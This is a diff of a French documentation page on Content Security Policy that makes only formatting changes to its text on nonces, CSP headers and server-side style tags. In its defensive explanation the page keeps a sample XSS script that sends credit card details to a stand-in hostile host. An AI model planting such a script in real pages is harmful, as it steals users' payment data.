@@ -4,12 +4,11 @@
 
 ## Qu'est-ce que le CSP et en quoi est-ce utile ?
 
-Fondamentalement, CSP atténue les attaques XSS (Cross-Site Scripting) en obligeant les développeurs à ajouter aux listes blanches les sources de leurs ressources. Cette liste est renvoyée en tant qu'en-tête du serveur. Par exemple, disons que vous avez un site hébergé à ` https://example.com ` l'en-tête CSP ` default-src: 'self'; ` autorisera toutes les requêtes à destination de ` https://example.com/* ` et refusera tous les autres. Si une section de votre site Web est vulnérable au XSS dans laquelle une entrée d'utilisateur non échappée est affichée, un attaquant pourrait saisir quelque chose du genre :
+Fondamentalement, CSP atténue les attaques XSS (Cross-Site Scripting) en obligeant les développeurs à ajouter aux listes blanches les sources de leurs ressources. Cette liste est renvoyée en tant qu'en-tête du serveur. Par exemple, disons que vous avez un site hébergé à `https://example.com` l'en-tête CSP `default-src: 'self';` autorisera toutes les requêtes à destination de `https://example.com/*` et refusera tous les autres. Si une section de votre site Web est vulnérable au XSS dans laquelle une entrée d'utilisateur non échappée est affichée, un attaquant pourrait saisir quelque chose du genre :
 
     <script>
       sendCreditCardDetails('https://hostile.example');
     </script>
-    
 
 Cette vulnérabilité permettrait à l'attaquant d'exécuter n'importe quoi. Cependant, avec un en-tête CSP sécurisé, le navigateur ne chargera pas ce script.
 
@@ -30,8 +29,7 @@ const nonce = new Buffer(uuidv4()).toString('base64');
 Il est très important d’utiliser UUID version 4, car cela génère un token ** imprévisible. **. Vous appliquez ensuite ce nonce à l'en-tête CSP. Un en-tête CSP pourrait ressembler à ceci avec le nonce appliqué:
 
 ```js
-header('Content-Security-Policy')
-  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
+header('Content-Security-Policy').set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
 ```
 
 Si vous utilisez le rendu SSR (Server Side Rendering), vous devez transmettre le nonce dans la balise `<style>` sur le serveur.
@@ -40,7 +38,7 @@ Si vous utilisez le rendu SSR (Server Side Rendering), vous devez transmettre le
 <style
   id="jss-server-side"
   nonce={nonce}
-  dangerouslySetInnerHTML={{ __html: sheetsRegistry.toString() } }
+  dangerouslySetInnerHTML={{ __html: sheetsRegistry.toString() }}
 />
 ```
 
